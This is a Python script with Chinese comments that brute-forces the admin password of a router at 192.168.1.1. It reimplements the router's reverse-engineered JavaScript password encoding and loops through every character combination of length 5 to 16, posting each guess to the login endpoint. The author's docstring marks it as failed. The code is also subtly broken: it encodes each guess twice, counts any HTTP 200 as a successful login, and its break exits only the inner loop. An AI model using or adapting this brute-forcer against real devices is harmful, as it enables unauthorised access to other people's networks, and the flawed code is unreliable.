import requests
import itertools
import time

"""
失败....
"""

# 访问测试
# url = "http://192.168.1.1/"
# r = requests.get(url)
# print("状态码：",r)
# print("网页内容：",r.text)

# 装饰器 计算时间
def time_out(a_func):
    def clocked(*args, **kwargs):
        start = time.time()
        result = a_func(*args, **kwargs)
        end = time.time()
        print("程序：" + a_func.__name__,"    运行时间：" + str(end - start))
        return result
    return clocked



# js逆向 得到路由器密码加密方式
def security_encode(b):
    a = 'RDpbLfCPsJZ7fiv'
    c = 'yLwVl0zKqws7LgKPRQ84Mdt708T1qQ3Ha7xv3H7NyU84p21BriUWBU43odz3iP4rBL3cD02KZciXTysVXiV8ngg6vL48rPJyAUw0HurW20xqxv9aYb4M9wK1Ae0wlro510qXeU07kV57fQMc8L6aLgMLwygtc0F10a0Dg70TOoouyFhdysuRMO51yY5ZlOZZLEal1h0t9YQW0Ko7oBwmCAHoic4HYbUyVeU3sfQ1xtXcPcf1aT303wAQhv66qzW'

    e = ''
    g = len(a)
    h = len(b)
    k = len(c)

    f = g if g > h else h
    for p in range(f):
        n = l = 187
        if p >= g:
            n = ord(b[p])
        elif p >= h:
            l = ord(a[p])
        else:
            l = ord(a[p])
            n = ord(b[p])
        e += c[((l ^ n) % k)]

    return e


# 使用加密后的密码开始登陆路由器后台
def login(password):
    requests.get('http://192.168.1.1', headers={'Content-Type': 'application/json'})
    r = requests.post('http://192.168.1.1', json={"method": "do", "login": {"password": security_encode(password)}})

    code = r.status_code
    if code == 200:
        print('状态码：',code,"密码正确，登陆成功！！！！！！！")
    else:
        print('状态码：', code, "密码错误，继续尝试登陆.......")
    return code
# 密码字典  生成密码
@time_out
def num_z_Z_symbol(a=5,count=0):
    """
    我认为的所有密码：
    数字 + 小写字母 + 大写字母 + 符号
    :return:
    """
    chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ~!@#$%^&*?_-."

    for i in range(5, 17):  # 密码长度  从5位数开始  16位数密码结束
        for c in itertools.product(chars, repeat=i):
            count += 1
            password = ''.join(c)
            print('*************** 第 ' + str(count) + ' 组密码 ***************')
            print(password)
            e = security_encode(password)
            if login(e) == 200:
                print("密码破解成功，程序退出！")
                break
            else:
                pass


if __name__ == '__main__':

    # 开始硬解
    num_z_Z_symbol()
